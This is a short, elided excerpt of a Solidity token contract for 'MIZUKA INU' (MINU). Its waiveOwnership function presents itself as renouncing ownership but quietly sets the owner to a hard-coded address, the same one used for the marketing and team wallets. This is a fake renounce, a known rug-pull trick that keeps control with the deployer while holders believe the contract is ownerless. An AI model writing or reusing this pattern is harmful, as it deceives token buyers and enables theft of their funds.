...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xA0EC19F089C84015618acC298e5ffBF5c0F58062));
        _owner = address(0xA0EC19F089C84015618acC298e5ffBF5c0F58062);
    }
...
contract MIZUKAINU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MIZUKA INU";
    string private _symbol = "MINU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA0EC19F089C84015618acC298e5ffBF5c0F58062);
    address payable public teamWalletAddress = payable(0xA0EC19F089C84015618acC298e5ffBF5c0F58062);
